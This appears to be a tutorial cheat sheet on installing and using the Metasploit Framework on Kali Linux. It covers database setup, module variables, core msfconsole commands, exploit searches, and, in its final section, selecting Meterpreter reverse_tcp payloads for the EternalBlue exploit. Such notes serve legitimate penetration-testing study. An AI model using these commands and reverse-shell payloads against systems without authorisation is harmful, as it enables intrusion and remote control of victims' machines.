## Installation & Setup (Kali Linux)

```bash
# Update and install/upgrade MSF
sudo apt-get update && sudo apt-get install metasploit-framework

# Enable PostgreSQL to start on boot
sudo systemctl enable postgresql
sudo systemctl start postgresql

# Initialize the MSF database
sudo msfdb init

# Check database status
sudo msfdb status

# Launch MSFconsole
msfconsole
```

Once inside, verify DB connection with `db_status` → should show `Connected to msf, connection type: postgresql`

## Key Module Variables

|Variable|Meaning|
|---|---|
|`LHOST`|Attacker's IP (for reverse shell callback)|
|`LPORT`|Attacker's listening port|
|`RHOST`|Single target IP|
|`RHOSTS`|Multiple targets / IP range|
|`RPORT`|Target service port (e.g. 445 for SMB)|

## Essential MSFconsole Commands

```bash
help                          # Show all commands
version                       # Show MSF version
show all / show exploits      # List modules
search portscan               # Search by keyword
search cve:2017 type:exploit platform:windows  # Filtered search
use auxiliary/scanner/portscan/tcp  # Load a module
use 0                         # Load by index number
show options                  # Show module options
set RHOSTS 192.168.1.10       # Set a variable
set PORTS 1-1000              # Set port range
run / exploit                 # Execute module
back                          # Unload module
sessions                      # List active sessions
connect 192.168.1.1 80        # Banner-grab (like netcat)
Ctrl+C                        # Interrupt running module
Ctrl+L                        # Clear screen
```

## Payload Selection for EternalBlue Example

When loading an exploit, MSF auto-suggests a default payload. You can override it:

```bash
set payload windows/x64/meterpreter/reverse_tcp  # 64-bit staged
set payload windows/meterpreter/reverse_tcp       # 32-bit staged
```
